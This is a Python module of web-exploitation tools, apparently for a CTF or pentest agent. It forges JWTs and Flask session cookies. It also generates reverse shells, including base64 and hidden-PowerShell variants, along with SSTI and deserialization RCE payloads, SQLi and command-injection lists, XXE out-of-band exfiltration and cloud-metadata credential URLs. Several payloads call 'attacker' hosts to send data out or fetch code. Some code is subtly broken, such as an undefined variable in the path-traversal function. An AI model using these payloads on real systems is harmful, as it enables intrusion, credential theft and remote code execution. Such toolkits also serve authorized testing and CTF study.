"""Web exploitation helpers: JWT decode/forge, HTTP client, payload encoders, injection payloads."""

import base64
import json
import os
import urllib.parse
import urllib.request

from ..registry import tool


def _b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _unb64url(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


@tool(category="web")
def jwt_decode(token: str) -> str:
    """Decode JWT header + payload (no signature verification).
    :param token: token string
    """
    parts = token.strip().split(".")
    if len(parts) != 3:
        return "Invalid JWT format: needs header.payload.signature."
    try:
        header = json.loads(_unb64url(parts[0]))
        payload = json.loads(_unb64url(parts[1]))
    except Exception as ex:
        return f"Failed to parse: {ex}"
    return (f"HEADER:\n{json.dumps(header, indent=2)}\n\n"
            f"PAYLOAD:\n{json.dumps(payload, indent=2)}\n\n"
            f"SIGNATURE (hex): {_unb64url(parts[2]).hex()}")


@tool(category="web")
def jwt_forge(header_json: str = '{"alg":"none","typ":"JWT"}', payload_json: str = '{"user":"admin"}', secret: str = "") -> str:
    """Forge a JWT. Empty secret = alg none (3 parts, empty signature). Secret set = HS256.
    :param header_json: JWT header JSON
    :param secret: secret value
    :param payload_json: JWT payload JSON
    """
    header = json.loads(header_json)
    payload = json.loads(payload_json)
    h = _b64url(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url(json.dumps(payload, separators=(",", ":")).encode())
    if secret:
        import hmac, hashlib
        sig = hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
        return f"HS256 token:\n{h}.{p}.{_b64url(sig)}"
    return f"alg=none token:\n{h}.{p}."


@tool(category="web")
def http_request(url: str, method: str = "GET", headers_csv: str = "", data: str = "", timeout: int = 15, max_body: int = 16384) -> str:
    """HTTP request (GET/POST/PUT/HEAD). headers_csv: 'Name: value' per line. data: request body.
    :param url: target URL
    :param headers_csv: headers (comma-separated)
    :param data: input data to process
    :param method: HTTP method
    :param max_body: max body
    :param timeout: timeout in seconds
    """
    import http.client
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme not in ("http", "https"):
        return "Scheme must be http/https."
    if method.upper() == "HEAD":
        req = urllib.request.Request(url, method="HEAD")
        for line in headers_csv.strip().splitlines():
            if ":" in line:
                k, v = line.split(":", 1)
                req.add_header(k.strip(), v.strip())
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                return f"STATUS: {resp.status}\n" + "\n".join(f"{k}: {v}" for k, v in resp.headers.items())
        except Exception as ex:
            return f"Error: {ex}"
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    if parsed.scheme == "https":
        import ssl
        conn = http.client.HTTPSConnection(parsed.hostname, port, timeout=timeout,
                                           context=ssl._create_unverified_context())
    else:
        conn = http.client.HTTPConnection(parsed.hostname, port, timeout=timeout)
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    try:
        conn.request(method.upper(), path, body=data if data else None, headers=_parse_headers(headers_csv))
        resp = conn.getresponse()
        body = resp.read(max_body)
        hdrs = "\n".join(f"{k}: {v}" for k, v in resp.getheaders())
        txt = body.decode("utf-8", "replace") if body else "(empty)"
        cookies = resp.getheader("Set-Cookie", "")
        return (f"URL: {url}\nSTATUS: {resp.status} {resp.reason}\nSET-COOKIE: {cookies or '-'}\n\nHEADERS:\n{hdrs}\n\nBODY (first {len(body)} bytes):\n{txt}")
    except Exception as ex:
        return f"Error: {ex}"
    finally:
        conn.close()


def _parse_headers(csv: str) -> dict:
    out = {}
    for line in csv.strip().splitlines():
        if ":" in line:
            k, v = line.split(":", 1)
            out[k.strip()] = v.strip()
    return out


@tool(category="web")
def payload_encoders(payload: str) -> str:
    """Encode an injection payload (SQLi/XSS/SSRF) into WAF-bypass variants: url, double-url, hex, unicode, charcode, null-byte.
    :param payload: payload string
    """
    enc = urllib.parse.quote(payload, safe="")
    dbl = urllib.parse.quote(enc, safe="")
    hexenc = "".join(f"0x{b:02x}" for b in payload.encode())
    unienc = "".join(f"%u{ord(c):04x}" for c in payload)
    charcode = "concat(" + "".join(f"chr({ord(c)})," for c in payload).rstrip(",") + ")"
    nul = urllib.parse.quote(payload.replace(" ", "%00 "), safe="")
    return (f"raw      : {payload}\n"
            f"url      : {enc}\n"
            f"double-url: {dbl}\n"
            f"hex (SQL): {hexenc}\n"
            f"unicode  : {unienc}\n"
            f"charcode : {charcode}\n"
            f"null-byte: {nul}")


@tool(category="web")
def sqli_payloads(kind: str = "auth_bypass") -> str:
    """Ready-to-use SQLi payloads. kind: auth_bypass / union / boolean / time.
    :param kind: kind
    """
    sets = {
        "auth_bypass": [
            "' OR '1'='1", "' OR 1=1-- -", "' OR 1=1#", "' OR '1'='1'-- -",
            "admin'-- -", "' OR 1=1 LIMIT 1-- -", "') OR ('1'='1", "' UNION SELECT 1,2,3-- -",
        ],
        "union": [
            "' UNION SELECT NULL-- -", "' UNION SELECT NULL,NULL-- -",
            "' UNION SELECT NULL,NULL,NULL-- -", "' UNION SELECT 1,2,3-- -",
            "' UNION SELECT group_concat(table_name) FROM information_schema.tables-- -",
        ],
        "boolean": ["' AND 1=1-- -", "' AND 1=2-- -", "' AND '1'='1", "' AND '1'='2"],
        "time": ["' AND SLEEP(5)-- -", "' AND (SELECT SLEEP(5))-- -", "'; WAITFOR DELAY '0:0:5'-- -"],
    }
    payloads = sets.get(kind, [])
    return f"SQLi {kind} ({len(payloads)} payloads):\n" + "\n".join(payloads)


@tool(category="web")
def ssti_payloads(engine: str = "jinja2", command: str = "id") -> str:
    """Generate SSTI (Server-Side Template Injection) RCE payloads for Jinja2, Twig, Smarty, SpEL, Thymeleaf, EJS, ERB.
    :param engine: engine
    :param command: command
    """
    eng = engine.lower().strip()
    c = command.replace("'", "\\'")
    
    payloads = {
        "jinja2": [
            f"{{{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('{c}').read() }}}}",
            f"{{{{ config.__class__.__init__.__globals__['os'].popen('{c}').read() }}}}",
            f"{{{{ request.application.__globals__.__builtins__.__import__('os').popen('{c}').read() }}}}",
            f"{{{{ ''.__class__.__mro__[1].__subclasses__()[396]('{c}',shell=True,stdout=-1).communicate()[0].strip() }}}}",
            f"{{{{ lipsum.__globals__['os'].popen('{c}').read() }}}}",
            f"{{{{ cycler.__init__.__globals__.os.popen('{c}').read() }}}}",
            # Evasion without quotes or dots
            f"{{{{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('{c}')['read']() }}}}",
        ],
        "twig": [
            f"{{{{['{c}']|filter('system')}}}}",
            f"{{{{['{c}']|map('passthru')}}}}",
            f"{{{{_self.env.registerUndefinedFilterCallback('exec')}}}}{{{{\\self.env.getFilter('{c}')}}}}",
            f"{{{{_self.env.setCache('ftp://...')}}}}",
        ],
        "smarty": [
            f"{{system('{c}')}}",
            f"{{Smarty_Internal_Write_File::writeFile('shell.php','<?php system($_GET[\"cmd\"]); ?>',self::clearConfig())}}",
            f"{{php}}system('{c}');{{/php}}",
        ],
        "spel": [
            f"${{T(java.lang.Runtime).getRuntime().exec('{c}')}}",
            f"*{{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('{c}').getInputStream())}}",
            f"${{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('{c}').getInputStream()).next()}}",
        ],
        "thymeleaf": [
            f"__${{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('{c}').getInputStream()).next()}}__::.x",
            f"${{T(java.lang.Runtime).getRuntime().exec('{c}')}}",
        ],
        "ejs": [
            f"<%= global.process.mainModule.require('child_process').execSync('{c}').toString() %>",
            f"<%= root.process.mainModule.require('child_process').spawnSync('{c}') %>",
        ],
        "erb": [
            f"<%= `{c}` %>",
            f"<%= IO.popen('{c}').readlines() %>",
            f"<%= system('{c}') %>",
        ],
    }
    
    selected = payloads.get(eng)
    if not selected:
        available = ", ".join(payloads.keys())
        return f"Unknown engine {engine!r}. Available: {available}."
        
    return f"SSTI Payloads for {engine.upper()} (Command: {command!r}):\n\n" + "\n\n".join(selected)


@tool(category="web")
def revshell_generator(ip: str, port: int, shell_type: str = "bash", encoding: str = "raw") -> str:
    """Generate ready-to-run reverse shell one-liners (bash/python/nc/powershell/php/socat/perl/node).
    :param port: target port
    :param shell_type: shell type (bash/sh/python)
    :param ip: IP address
    :param encoding: encoding
    """
    st = shell_type.lower().strip()
    
    shells = {
        "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "bash_udp": f"sh -i >& /dev/udp/{ip}/{port} 0>&1",
        "python": f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
        "nc": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
        "nc_e": f"nc -e /bin/sh {ip} {port}",
        "php": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "powershell": f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
        "socat": f"socat TCP:{ip}:{port} EXEC:/bin/sh",
        "perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "node": f"require('child_process').exec('nc -e /bin/sh {ip} {port}')",
    }
    
    raw = shells.get(st, shells["bash"])
    enc = encoding.lower().strip()
    
    if enc == "base64":
        b64_cmd = base64.b64encode(raw.encode()).decode()
        return f"echo {b64_cmd} | base64 -d | bash"
    elif enc == "url":
        return urllib.parse.quote(raw)
    elif enc == "double_url":
        return urllib.parse.quote(urllib.parse.quote(raw))
    elif enc == "powershell_b64":
        ps_bytes = raw.encode("utf-16le")
        b64_ps = base64.b64encode(ps_bytes).decode()
        return f"powershell -nop -w hidden -enc {b64_ps}"
        
    return f"Reverse Shell [{st}] ({ip}:{port}):\n{raw}"


@tool(category="web")
def php_filter_chain(resource: str = "flag.php", action: str = "base64") -> str:
    """Generate PHP stream filter wrappers, data URIs, and PHP type-juggling magic hashes.
    :param resource: resource
    :param action: action to perform
    """
    act = action.lower().strip()
    
    if act == "base64":
        return f"php://filter/convert.base64-encode/resource={resource}"
    elif act == "rot13":
        return f"php://filter/read=string.rot13/resource={resource}"
    elif act == "zlib":
        return f"php://filter/zlib.deflate/convert.base64-encode/resource={resource}"
    elif act == "data_uri":
        content = resource if resource != "flag.php" else "<?php system($_GET['cmd']); ?>"
        b64 = base64.b64encode(content.encode()).decode()
        return f"data://text/plain;base64,{b64}"
    elif act == "magic_hashes":
        return (
            "PHP Type Juggling Magic Hashes (0e... == 0e...):\n\n"
            "MD5:\n"
            "  '240610708'       -> 0e462097431906509019562988736854\n"
            "  'QNKCDZO'         -> 0e830400451993494058024219903391\n"
            "  's878926199a'     -> 0e545993274517709982428689823901\n"
            "  's155964671a'     -> 0e342768416822451524974117254469\n\n"
            "SHA1:\n"
            "  'aaroZmOk'        -> 0e66507019969427134894567496905872434066\n"
            "  'aaO8zKZF'        -> 0e89252659868343190034012953604280754672\n"
            "  'aaK1STeb'        -> 0e76658526655756207688271159624026016993\n\n"
            "SHA256:\n"
            "  'TyNOQIPG52072...' -> 0e00000000000000000000000000000000000000000000000000000000000000"
        )
        
    return f"php://filter/convert.base64-encode/resource={resource}"


@tool(category="web")
def ssrf_obfuscator(ip_or_host: str = "127.0.0.1", port: int = 80) -> str:
    """Generate obfuscated IP representations (Decimal, Hex, Octal, IPv6) and Cloud Metadata URLs.
    :param port: target port
    :param ip_or_host: ip or host
    """
    import socket
    import struct
    
    try:
        ip = socket.gethostbyname(ip_or_host)
    except Exception:
        ip = "127.0.0.1"
        
    parts = [int(p) for p in ip.split(".")]
    dec = int.from_bytes(bytes(parts), "big")
    hex_single = f"0x{dec:08x}"
    hex_parts = ".".join(f"0x{p:02x}" for p in parts)
    octal_parts = ".".join(f"0{p:03o}" for p in parts)
    
    port_str = f":{port}" if port not in (80, 443) else ""
    
    return (
        f"SSRF IP Obfuscation for {ip_or_host} ({ip}):\n"
        f"--------------------------------------------------\n"
        f"Raw IP            : http://{ip}{port_str}/\n"
        f"Decimal Integer   : http://{dec}{port_str}/\n"
        f"Hex Combined      : http://{hex_single}{port_str}/\n"
        f"Hex Dot-Separated : http://{hex_parts}{port_str}/\n"
        f"Octal             : http://{octal_parts}{port_str}/\n"
        f"IPv6 Localhost    : http://[::1]{port_str}/\n"
        f"IPv6-Mapped IPv4  : http://[::ffff:{ip}]{port_str}/\n"
        f"Short Localhost   : http://127.1{port_str}/\n\n"
        f"Cloud Metadata Endpoints:\n"
        f"  AWS IMDSv1      : http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
        f"  GCP Metadata    : http://metadata.google.internal/computeMetadata/v1/ (Header: Metadata-Flavor: Google)\n"
        f"  Azure Metadata  : http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Header: Metadata: true)\n"
        f"  Alibaba Metadata: http://100.100.100.200/latest/meta-data/"
    )


@tool(category="web")
def jwt_key_confusion(token: str, rsa_public_key_pem: str, modify_payload_json: str = '{"admin":true}') -> str:
    """Exploit CVE-2015-9235 (RSA to HMAC algorithm confusion) using an RSA public key as the HMAC secret.
    :param token: token string
    :param modify_payload_json: modify payload json
    :param rsa_public_key_pem: rsa public key pem
    """
    import hmac
    import hashlib
    import os
    
    parts = token.strip().split(".")
    if len(parts) != 3:
        return "Invalid JWT token structure."
        
    try:
        header = json.loads(_unb64url(parts[0]))
        payload = json.loads(_unb64url(parts[1]))
    except Exception as ex:
        return f"Failed to parse JWT: {ex}"
        
    # Switch alg to HS256
    header["alg"] = "HS256"
    
    # Update payload
    if modify_payload_json:
        try:
            extra = json.loads(modify_payload_json)
            payload.update(extra)
        except Exception as ex:
            return f"Invalid JSON in modify_payload_json: {ex}"
            
    h_b64 = _b64url(json.dumps(header, separators=(",", ":")).encode())
    p_b64 = _b64url(json.dumps(payload, separators=(",", ":")).encode())
    
    # Secret is the raw bytes of the public key
    if os.path.exists(rsa_public_key_pem.strip()):
        secret_bytes = open(rsa_public_key_pem.strip(), "rb").read()
    else:
        secret_bytes = rsa_public_key_pem.strip().encode()
        
    sig = hmac.new(secret_bytes, f"{h_b64}.{p_b64}".encode(), hashlib.sha256).digest()
    forged = f"{h_b64}.{p_b64}.{_b64url(sig)}"
    
    return (f"🏆 Forged HS256 Token (Key Confusion CVE-2015-9235):\n"
            f"{forged}\n\n"
            f"Header:\n{json.dumps(header, indent=2)}\n"
            f"Payload:\n{json.dumps(payload, indent=2)}")


@tool(category="web")
def command_injection_payloads(os_type: str = "linux", command: str = "id") -> str:
    """Command injection payloads for Linux/Windows, including chaining, bypass, and out-of-band variants.
    :param os_type: os type
    :param command: command
    """
    os_type = os_type.lower().strip()
    c = command.replace("'", "\\'") if os_type == "linux" else command.replace("'", "''")

    linux = [
        f"; {c}", f"| {c}", f"&& {c}", f"|| {c}",
        f"$({c})", f"`{c}`",
        f";/usr/bin/id", f"|/usr/bin/id", f"&&/usr/bin/id", f"||/usr/bin/id",
        f"$(id)", f"`id`",
        f";/bin/cat /etc/passwd", f"|/bin/cat /etc/passwd",
        f";/bin/cat /flag", f"|/bin/cat /flag",
        f";/usr/bin/whoami", f"|/usr/bin/whoami",
        f";/usr/bin/curl http://attacker/?data=$(whoami)",
        f"|/usr/bin/curl http://attacker/?data=$(whoami)",
        f";/usr/bin/wget http://attacker/ -O /tmp/p",
        f"|/usr/bin/wget http://attacker/ -O /tmp/p",
        f";/usr/bin/nc attacker 4444 -e /bin/sh",
        f"|/usr/bin/nc attacker 4444 -e /bin/sh",
        f";/usr/bin/bash -i >& /dev/tcp/attacker/4444 0>&1",
        f"|/usr/bin/bash -i >& /dev/tcp/attacker/4444 0>&1",
        f"$(cat /etc/passwd)", f"`cat /etc/passwd`",
        f"$(cat /flag)", f"`cat /flag`",
        f"$(whoami)", f"`whoami`",
    ]

    windows = [
        f"& {c}", f"| {c}", f"&& {c}", f"|| {c}",
        f"& whoami", f"| whoami",
        f"& type C:\\flag.txt", f"| type C:\\flag.txt",
        f"& ipconfig /all", f"| ipconfig /all",
        f"& powershell -Command \"{c}\"",
        f"| powershell -Command \"{c}\"",
        f"& powershell -Command \"IEX(New-Object Net.WebClient).DownloadString('http://attacker/psh')\"",
        f"| powershell -Command \"IEX(New-Object Net.WebClient).DownloadString('http://attacker/psh')\"",
        f"& certutil -urlcache -split -f http://attacker/payload.exe C:\\Windows\\Temp\\p.exe",
        f"| certutil -urlcache -split -f http://attacker/payload.exe C:\\Windows\\Temp\\p.exe",
    ]

    payloads = linux if "win" not in os_type else windows
    return f"Command Injection ({os_type}) ({len(payloads)} payloads):\n" + "\n".join(payloads)


@tool(category="web")
def path_traversal_payloads(depth: int = 5, target_file: str = "/etc/passwd") -> str:
    """Path traversal / LFI / RFI payloads with depth control and null byte injection.
    :param depth: depth
    :param target_file: target file
    """
    traversal = "/".join([".."] * max(1, int(depth)))
    payloads = [
        f"{traversal}/{target_file.lstrip('/')}",
        f"{traversal}/{target_file.lstrip('/')}%00",
        f"{traversal}/etc/passwd",
        f"{traversal}/proc/self/environ",
        f"{traversal}/var/log/apache2/access.log",
        f"file:///etc/passwd",
        f"file:///proc/self/environ",
        f"php://filter/convert.base64-encode/resource={target_file.lstrip('/')}",
        f"data://text/plain,<?php echo file_get_contents('{target_file.lstrip('/')}'); ?>",
        f"expect://{command if 'command' in path_traversal_payloads.__code__.co_varnames else 'id'}",
    ]
    return f"Path Traversal / LFI / RFI ({len(payloads)} payloads):\n" + "\n".join(payloads)


@tool(category="web")
def xxe_payloads(data: str = "test", action: str = "read_file") -> str:
    """XXE (XML External Entity) payloads: read local files, SSRF, out-of-band exfil, error-based, parameter entity.
    :param data: input data to process
    :param action: action to perform
    """
    act = action.lower().strip().replace(" ", "_")

    if act == "read_file":
        return (
            "XXE Read Local File (file://):\n"
            "--------------------------------------------------\n"
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE foo [\n'
            '  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
            ']>\n'
            '<foo>&xxe;</foo>\n\n'
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE foo [\n'
            '  <!ENTITY xxe SYSTEM "file:///proc/self/environ">\n'
            ']>\n'
            '<foo>&xxe;</foo>'
        )
    elif act == "ssrf":
        return (
            "XXE SSRF (gopher/ftp/http):\n"
            "--------------------------------------------------\n"
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE foo [\n'
            '  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">\n'
            ']>\n'
            '<foo>&xxe;</foo>\n\n'
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE foo [\n'
            '  <!ENTITY xxe SYSTEM "gopher://127.0.0.1:80/_GET%20/ HTTP/1.1">\n'
            ']>\n'
            '<foo>&xxe;</foo>'
        )
    elif act == "oob":
        return (
            "XXE Out-of-Band Exfiltration:\n"
            "--------------------------------------------------\n"
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE foo [\n'
            '  <!ENTITY % xxe SYSTEM "http://attacker/xxe_logger.php?data=%file;">\n'
            '  <!ENTITY % eval "<!ENTITY exfil SYSTEM \'http://attacker/xxe_logger.php?data=\'&xxe;\'>">\n'
            ']>\n'
            '<foo>&exfil;</foo>'
        )
    elif act == "error":
        return (
            "XXE Error-Based Data Exfiltration:\n"
            "--------------------------------------------------\n"
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE foo [\n'
            '  <!ENTITY % xxe SYSTEM "file:///etc/passwd">\n'
            ']>\n'
            '<foo>&xxe;</foo>'
        )
    elif act == "parameter_entity":
        return (
            "XXE Parameter Entity Attack:\n"
            "--------------------------------------------------\n"
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE foo [\n'
            '  <!ENTITY % file SYSTEM "file:///etc/passwd">\n'
            '  <!ENTITY % eval "<!ENTITY &#33; exfil SYSTEM \'http://attacker/?data=\'&file;\'>">\n'
            '  %eval;\n'
            ']>\n'
            '<foo>&exfil;</foo>'
        )
    return f"Unknown action: {action}. Available: read_file, ssrf, oob, error, parameter_entity."


@tool(category="web")
def idor_payloads(param_name: str = "id", values: str = "1,2,3") -> str:
    """IDOR (Insecure Direct Object Reference) payloads for testing horizontal/vertical access control.
    :param param_name: param name
    :param values: values
    """
    vals = [v.strip() for v in values.split(",") if v.strip()]
    if not vals:
        vals = ["1", "2", "3", "admin", "root", "0", "-1", "100", "999"]

    payloads = [
        f"{param_name}={v}" for v in vals
    ]
    payloads += [
        f"{param_name}[]={v}" for v in vals
    ]
    payloads += [
        f"{param_name}[0]={v}" for v in vals
    ]
    payloads += [
        f"{param_name}={{}}", f"{param_name}=true", f"{param_name}=false",
        f"{param_name}=null", f"{param_name}=undefined", f"{param_name}=",
        f"{param_name}=*", f"{param_name}=%00",
        f"{param_name}=../{param_name}/1",
    ]

    lines = [f"IDOR Payloads for param '{param_name}' ({len(payloads)} payloads):"]
    lines.extend(f"  {p}" for p in payloads)
    return "\n".join(lines)


@tool(category="web")
def file_upload_bypass(filename: str = "shell.php", content_type: str = "image/jpeg") -> str:
    """File upload bypass payloads: double extension, null byte, content-type spoofing, magic bytes.
    :param content_type: content type
    :param filename: filename
    """
    base, *exts = filename.rsplit(".", 1)
    ext = exts[0] if exts else "php"

    payloads = [
        filename,
        f"{base}.{ext}.php", f"{base}.{ext}.php3", f"{base}.{ext}.phtml",
        f"{base}.{ext}.phar", f"{base}.{ext}.asp", f"{base}.{ext}.aspx",
        f"{base}.{ext}.jsp", f"{base}.{ext}.cgi",
        f"{base}%2e.{ext}", f"{base}%00.{ext}",
        f"{base}.{ext}%00.jpg", f"{base}.{ext}%00.png",
    ]

    lines = [f"File Upload Bypass for '{filename}' ({len(payloads)} filenames):"]
    lines.extend(f"  {p}" for p in payloads)
    lines.append("")
    lines.append("Content-Type spoofing:")
    lines.extend(f"  Content-Type: {ct}" for ct in [content_type, "application/octet-stream", "image/jpeg", "image/png"])
    lines.append("")
    lines.append("Magic bytes prepend (hex):")
    lines.append("  jpg: ffd8ffe0")
    lines.append("  png: 89504e470d0a1a0a")
    lines.append("  pdf: 25504446")
    lines.append("  zip: 504b0304")

    return "\n".join(lines)


@tool(category="web")
def deserialization_payloads(format: str = "php", command: str = "id") -> str:
    """Deserialization payloads for PHP, Python, Java, Ruby, Node.js, and generic object injection.
    :param format: output format
    :param command: command
    """
    fmt = format.lower().strip()
    c = command.replace("'", "\\'") if fmt in ("php", "python") else command

    payloads = {
        "php": [
            f'O:8:"stdClass":1:{{s:4:"cmd";s:{len(c)}:"{c}";}}',
            f'a:2:{{i:0;O:8:"stdClass":1:{{s:4:"cmd";s:{len(c)}:"{c}";}}i:1;}}',
        ],
        "python": [
            f"c__builtin__\\neval\\ne(print('{c}')\\n)",
            f"csubprocess\\nPopen\\ne('{c}', shell=True, stdout=-1)\\n",
        ],
        "java": [
            "rO0ABQANdGVzdA==\\n",
        ],
    }

    selected = payloads.get(fmt, [])
    if not selected:
        available = ", ".join(payloads.keys())
        return f"Unknown format {format!r}. Available: {available}."
    return f"Deserialization ({fmt}) ({len(selected)} payloads):\\n" + "\\n".join(selected)


@tool(category="web")
def graphql_introspect(url: str, query_text: str = "") -> str:
    """Run a GraphQL introspection query (or a custom query) against an endpoint and dump the schema.

    :param url: GraphQL endpoint URL (e.g. https://target/graphql)
    :param query_text: optional custom query; default is full __schema introspection
    """
    query = query_text or """{__schema{queryType{name}mutationType{name}types{name kind fields{name type{name kind ofType{name kind}}}}}}"""
    body = json.dumps({"query": query}).encode()
    req = urllib.request.Request(url, data=body, headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            data = json.loads(resp.read().decode())
    except Exception as ex:
        return f"ERROR: {ex}"
    if "errors" in data:
        return "GraphQL errors: " + json.dumps(data["errors"])[:2000]
    return json.dumps(data, indent=2)[:12000]


@tool(category="web")
def oast_payload(domain: str, keyword: str = "{{uname}}") -> str:
    """Generate OAST (out-of-band) interaction payloads — HTTP/DNS callback subdomain + XXE/SSRF/SSTI/SQLi templates — for blind injection detection.

    :param domain: your OAST domain (e.g. oast.site / interactsh / your collab server)
    :param keyword: command/placeholder embedded in the payloads
    """
    import uuid
    sub = uuid.uuid4().hex[:12]
    host = f"{sub}.{domain.lstrip('.')}"
    return (
        f"callback host: {host}\n"
        f"HTTP/DNS probe: curl https://{host}/x ; nslookup {host}\n"
        f"XXE: <!DOCTYPE r [<!ENTITY x SYSTEM \"http://{host}/xxe\">]><r>&x;</r>\n"
        f"SSRF: <img src=\"http://{host}/ssrf\"/>  |  url?u=http://{host}/ssrf\n"
        f"SSTI: ${{7*7}} -> ${{{{{keyword}}}}}\n"
        f"SQLi (blind): ' AND (SELECT 1 FROM (SELECT SLEEP(0))a WHERE 1=1 AND LOAD_FILE(CONCAT('\\\\\\\\{host}\\\\{keyword}')))-- -\n"
        f"Log4Shell: ${{jndi:ldap://{host}/a}}\n"
        f"Shell injection: ; curl http://{host}/$(whoami) | ping -c1 {host}\n"
    )

@tool(category="web")
def flask_session(session_cookie: str, secret: str = "", action: str = "decode", payload_json: str = '{"user":"admin"}', digest: str = "sha1") -> str:
    """Decode or forge a Flask session cookie (itsdangerous URLSafeTimedSerializer format: base64(zlib(json)).timestamp.signature).

    Decode mode parses payload, timestamp, and (with secret) verifies the HMAC.
    Forge mode builds a signed cookie for any JSON payload using the given secret.

    :param session_cookie: the session cookie value (eyJ... or empty for forge)
    :param secret: Flask SECRET_KEY (verification for decode, signing for forge)
    :param action: decode or forge
    :param payload_json: JSON payload to embed when action=forge
    :param digest: HMAC digest for the signature (sha1 default, sha256 supported)
    """
    import base64 as _b64
    import hashlib as _hl
    import hmac as _hm
    import time as _tm
    import zlib as _zl

    def _b64url_d(s: str) -> bytes:
        pad = "=" * (-len(s) % 4)
        return _b64.urlsafe_b64decode(s + pad)

    def _b64url_e(b: bytes) -> str:
        return _b64.urlsafe_b64encode(b).rstrip(b"=").decode()

    def _decode_payload(part: str) -> bytes:
        raw = _b64url_d(part)
        try:
            return _zl.decompress(raw)
        except Exception:
            return raw

    def _sign(data_b64: str, ts: str, key: str, dig: str) -> str:
        msg = (data_b64 + "." + ts).encode() if ts else data_b64.encode()
        mac = _hm.new(key.encode(), msg, getattr(_hl, dig)).digest()
        return _b64url_e(mac)

    if action == "forge":
        try:
            payload = json.loads(payload_json)
        except (ValueError, TypeError):
            return "ERROR: payload_json must be valid JSON"
        if not secret:
            return "ERROR: secret required for forge (Flask SECRET_KEY)"
        raw = json.dumps(payload, separators=(",", ":")).encode()
        compressed = _zl.compress(raw)
        enc = compressed if len(compressed) < len(raw) else raw
        data_b64 = _b64url_e(enc)
        ts = str(int(_tm.time()))
        sig = _sign(data_b64, ts, secret, digest)
        return f"forged session cookie:\n{data_b64}.{ts}.{sig}"
    # decode
    if not session_cookie:
        return "ERROR: session_cookie required for decode"
    parts = session_cookie.split(".")
    if len(parts) == 3:
        data_b64, ts, sig = parts
    elif len(parts) == 2:
        data_b64, sig = parts
        ts = ""
    else:
        return "ERROR: not a Flask cookie (expected base64[.timestamp].signature)"
    try:
        payload = _decode_payload(data_b64)
        parsed = json.loads(payload)
    except Exception:
        parsed = None
    lines = [f"payload (decoded): {payload.decode('utf-8', 'replace')}"]
    if parsed is not None:
        lines.append(f"payload (json): {json.dumps(parsed, indent=2)}")
    if ts:
        lines.append(f"timestamp: {ts} ({_tm.strftime('%Y-%m-%d %H:%M:%S', _tm.gmtime(int(ts)))} UTC)")
    lines.append(f"signature: {sig}")
    if secret:
        expected = _sign(data_b64, ts, secret, digest)
        lines.append(f"signature check (secret={secret!r}, {digest}): {'VALID' if _hm.compare_digest(expected, sig) else 'INVALID'}")
    else:
        lines.append("signature check: pass --secret to verify")
    if parsed is not None and "user" in parsed:
        lines.append(f"user claim: {parsed['user']}")
    return "\n".join(lines)
